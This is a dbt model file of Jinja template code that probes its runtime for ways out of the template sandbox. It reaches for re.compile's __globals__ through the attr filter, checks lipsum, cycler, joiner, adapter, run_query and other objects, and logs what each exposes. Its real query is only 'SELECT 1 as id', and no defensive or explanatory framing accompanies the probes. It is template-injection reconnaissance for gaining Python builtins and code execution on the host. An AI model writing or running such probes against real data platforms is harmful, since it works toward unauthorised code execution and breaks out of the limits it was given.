{# Probe re module globals for builtins access #}
{%- set re_mod = modules.re -%}
{{ log("RE_COMPILE_TYPE=" ~ re_mod.compile | string, info=True) }}

{# Method 1: Try __globals__ through attr filter #}
{%- set gg = re_mod.compile | attr('__globals__') -%}
{{ log("RE_GLOBALS_VIA_ATTR=" ~ gg | string | truncate(500), info=True) if gg else log("RE_GLOBALS_VIA_ATTR=NONE", info=True) }}

{# Method 2: Try lipsum, cycler, joiner, namespace #}
{{ log("LIPSUM=" ~ lipsum | string, info=True) if lipsum is defined else log("LIPSUM_UNDEF", info=True) }}
{{ log("CYCLER=" ~ cycler | string, info=True) if cycler is defined else log("CYCLER_UNDEF", info=True) }}
{{ log("JOINER=" ~ joiner | string, info=True) if joiner is defined else log("JOINER_UNDEF", info=True) }}
{{ log("NAMESPACE=" ~ namespace | string, info=True) if namespace is defined else log("NAMESPACE_UNDEF", info=True) }}

{# Method 3: Try adapter object #}
{{ log("ADAPTER_TYPE=" ~ adapter | string | truncate(200), info=True) if adapter is defined else log("ADAPTER_UNDEF", info=True) }}

{# Method 4: Try run_query, execute_model, statement #}
{{ log("RUN_QUERY=" ~ run_query | string, info=True) if run_query is defined else log("RUN_QUERY_UNDEF", info=True) }}
{{ log("EXECUTE_MODEL=" ~ execute_model | string, info=True) if execute_model is defined else log("EXECUTE_MODEL_UNDEF", info=True) }}
{{ log("STATEMENT=" ~ statement | string, info=True) if statement is defined else log("STATEMENT_UNDEF", info=True) }}

{# Method 5: range, dict #}
{{ log("RANGE=" ~ range | string, info=True) if range is defined else log("RANGE_UNDEF", info=True) }}
{{ log("DICT=" ~ dict | string, info=True) if dict is defined else log("DICT_UNDEF", info=True) }}

{# Method 6: self #}
{{ log("SELF=" ~ self | string | truncate(200), info=True) if self is defined else log("SELF_UNDEF", info=True) }}

{# Method 7: exceptions object #}
{{ log("EXCEPTIONS_TYPE=" ~ exceptions | string | truncate(200), info=True) if exceptions is defined else log("EXCEPTIONS_UNDEF", info=True) }}

{# Method 8: database, schema directly #}
{{ log("DATABASE_VAR=" ~ database, info=True) if database is defined else log("DATABASE_UNDEF", info=True) }}
{{ log("SCHEMA_VAR=" ~ schema, info=True) if schema is defined else log("SCHEMA_UNDEF", info=True) }}

{# Method 9: function object (dbt dispatch) #}
{{ log("FUNCTION_TYPE=" ~ function | string | truncate(200), info=True) if function is defined else log("FUNCTION_UNDEF", info=True) }}

SELECT 1 as id
